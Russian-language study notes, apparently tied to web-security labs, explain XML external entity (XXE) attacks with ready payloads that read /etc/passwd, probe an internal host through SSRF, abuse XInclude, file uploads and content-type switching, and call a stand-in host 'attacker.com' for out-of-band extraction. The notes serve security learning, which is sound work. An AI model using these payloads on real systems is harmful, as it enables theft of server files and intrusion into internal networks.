# Использование XXE для извлечения файлов

пример, где приложение использует XML для проверки уровня запасов товара. Злоумышленник может воспользоваться уязвимостью XXE для извлечения содержимого файла `/etc/passwd`.

1. **Исходный XML-запрос**:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>381</productId>
</stockCheck>
```

2. **Внедрение XXE**:  
	Злоумышленник изменяет запрос, добавляя определение внешней сущности, которая ссылается на файл `/etc/passwd`:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```


3. **Результат**:  
	Если приложение уязвимо к XXE, оно обработает внешнюю сущность `&xxe;` и вернет содержимое файла `/etc/passwd` в ответе:

#### Примечание
При реальных уязвимостях XXE в отправленном XML часто будет большое количество значений данных, любое из которых может быть использовано в ответе приложения. Для систематического тестирования на уязвимости XXE вам, как правило, нужно будет протестировать каждый узел данных в XML по отдельности, используя определенную вами сущность и проверяя, появляется ли она в ответе.


# Использование XXE для проведения SSRF-атак

- Поддержка внешней сущности http/https
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck>
	<foo>&xxe;</foo>
</stockCheck>
```

# Слепые уязвимости XXE

Многие случаи уязвимостей XXE являются слепыми. Это означает, что приложение не возвращает значения каких-либо определенных внешних сущностей в своих ответах, и поэтому прямое извлечение файлов на стороне сервера невозможно.

### XInclude атаки
Механизм для включения внешних ресурсов или фрагментов данных в XML-документы.

- Если парсер обрабатывает XInclude и не настроен безопасно, это может быть использовано для атак, похожих на XXE (XML External Entity), даже если обработка DTD и внешних сущностей отключена.

Пример чтения файла `/etc/passwd`:
```
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

#### Лаба
[[Лаборатория эксплуатация Xinclude для получения файлов]]

### Атаки XXE через загрузку файлов
Некоторые приложения позволяют загружать файлы, которые затем обрабатываются как XML. Если приложение не проверяет тип файла или содержимое, можно загрузить вредоносный XML-файл с внедренными внешними сущностями.

XML-файл с внедренной внешней сущностью:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

#### Лаба
[[Лаборатория эксплуатация xxe через загрузку файла изображения]]

### Атаки XXE через измененный тип контента
Иногда приложение может обрабатывать XML, даже если запрос отправляется с другим Content-Type (например, `application/json`). Изменение типа контента на `application/xml` или `text/xml` может привести к успешной эксплуатации XXE.

Изменить тип контента на `application/xml` и отправить XML-документ с внедренной внешней сущностью:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

### Out-of-Band (OOB) XXE
Если приложение не возвращает данные напрямую, можно использовать Out-of-Band каналы для извлечения данных. Например, отправить данные на внешний сервер, контролируемый злоумышленником.

```
<!DOCTYPE foo [ 
<!ENTITY % xxe SYSTEM "http://attacker.com/oob"> 
%xxe; 
]>
<foo></foo>
```

**Внеполосное соединение** (Out-of-Band, OOB) — это метод взаимодействия, при котором данные передаются через **дополнительный канал связи**, отличный от основного.
